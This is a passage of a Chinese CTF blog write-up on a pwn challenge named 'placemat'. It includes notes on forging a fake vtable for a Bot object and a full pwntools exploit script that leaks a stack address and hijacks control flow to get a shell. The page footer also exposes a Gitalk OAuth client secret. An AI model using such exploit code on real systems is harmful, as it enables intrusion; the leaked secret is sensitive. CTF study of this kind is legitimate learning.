sub_804AA96+8C↑o<br>.rodata:0804C1D4                                         ; .rodata:0804C1A8↑o<br>.rodata:0804C1D8                 dd offset a3bot         ; &quot;3Bot&quot;<br>.rodata:0804C1DC                 dd offset off_804C1E8<br></code></pre></div></td></tr></table></figure>

<p>伪造成上面这个样子, 除了typeinfo部分要换成Bot的typeinfo地址. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr])<br>pl2 = flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF18</span>, <span class="hljs-number">0x804AF4E</span>])<br></code></pre></div></td></tr></table></figure>

<p>注意Game class没有虚表指针, 不要看多了就看什么都是虚表. </p>
<p>好吧这样不行, 忽略了后面紧跟着的Game. 会被覆盖.</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&#x27;./placemat&#x27;</span><br>p = process(<span class="hljs-string">&quot;./placemat&quot;</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;yog&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>ru(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>stack_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>p2_name_addr = stack_addr + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span><br><br>log.success(<span class="hljs-string">f&#x27;leak value: 0x<span class="hljs-subst">&#123;stack_addr:x&#125;</span>&#x27;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr+<span class="hljs-number">20</span>+<span class="hljs-number">48</span>+<span class="hljs-number">4</span>])<br>pl2 = flat([<span class="hljs-string">b&#x27;fake_bot&#x27;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">20</span>+<span class="hljs-number">48</span>-<span class="hljs-number">8</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF4E</span>, <span class="hljs-number">0x804AF4E</span>])<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(pl1)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#gdb.attach(p, &#x27;b *0x804AA96\nc&#x27;)</span><br><span class="hljs-comment">#input(&#x27;wait for gdb&#x27;)</span><br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(pl2)<br><br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure>

<p>这个exp的问题是由于先手是随机的但是并未检测先手, 导致一半概率达不到想要的结果. 多试两次或者再写个大循环catch exception. </p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/PWN/">PWN</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022-11/CVE-dirtypipe/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">dirtypipe漏洞分析</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022-07/Now-CTF-supplement/">
                        <span class="hidden-mobile">CTF再开始</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"312db7ebbc085de5d28d","clientSecret":"85ea3cefd13c73a6d85c1813adfde4f1550bfbda","repo":"yogdzewa.github.io","owner":"yogdzewa","admin":["yogdzewa"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: 'e7cbc29aee2dec9d7993a11e2f15f0d4'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
